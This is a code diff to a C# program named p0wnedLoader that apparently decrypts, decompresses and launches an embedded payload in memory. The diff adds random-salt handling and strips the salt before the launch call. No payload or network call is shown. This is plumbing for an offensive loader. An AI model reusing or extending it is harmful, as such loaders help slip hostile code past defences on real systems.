@@ -21,6 +21,7 @@ using System;
 using System.Net;
 using System.Text;
 using System.IO;
+using System.Security;
 using System.Reflection;
 using System.Security.Cryptography;
 using System.IO.Compression;
@@ -84,6 +85,21 @@ namespace p0wnedLoader
             }
         }
 
+        class SecurePass
+        {
+            SecureString securePwd = new SecureString();
+
+            public SecureString convertToSecureString(string strPassword)
+            {
+                var secureStr = new SecureString();
+                if (strPassword.Length > 0)
+                {
+                    foreach (var c in strPassword.ToCharArray()) secureStr.AppendChar(c);
+                }
+                return secureStr;
+            }
+        }
+
         public static byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes)
         {
             byte[] decryptedBytes = null;
@@ -125,6 +141,14 @@ namespace p0wnedLoader
             }
 
             return decryptedBytes;
+        }
+
+        public byte[] GetRandomBytes()
+        {
+            int _saltSize = 4;
+            byte[] ba = new byte[_saltSize];
+            RNGCryptoServiceProvider.Create().GetBytes(ba);
+            return ba;
         }
 
         public static byte[] Decompress(byte[] data)
@@ -229,7 +253,17 @@ namespace p0wnedLoader
 
             byte[] bytesDecrypted = AES_Decrypt(decompressed, passwordBytes);
 
-            Launch(bytesDecrypted);
+            // Getting the size of salt
+            int _saltSize = 4;
+
+            // Removing salt bytes, retrieving original bytes
+            byte[] originalBytes = new byte[bytesDecrypted.Length - _saltSize];
+            for (int i = _saltSize; i < bytesDecrypted.Length; i++)
+            {
+                originalBytes[i - _saltSize] = bytesDecrypted[i];
+            }
+
+            Launch(originalBytes);
 
         }
     }
